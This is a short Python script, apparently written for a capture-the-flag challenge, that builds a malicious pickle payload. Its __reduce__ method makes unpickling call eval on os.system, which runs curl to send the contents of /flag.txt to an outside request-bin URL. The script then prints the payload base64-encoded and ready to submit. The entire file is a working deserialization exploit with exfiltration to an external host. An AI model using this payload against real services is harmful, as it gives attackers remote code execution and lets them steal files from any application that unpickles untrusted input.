import pickle
import base64

class Exp(object):
    def __reduce__(self):
        return (eval, ("""__import__('os').system('curl --data-binary @"/flag.txt" http://pomo-mondreganto.me/request_bin/bin/3a7af4223a')""",),)


shellcode = pickle.dumps(Exp(), protocol=0)
print(base64.b64encode(shellcode))

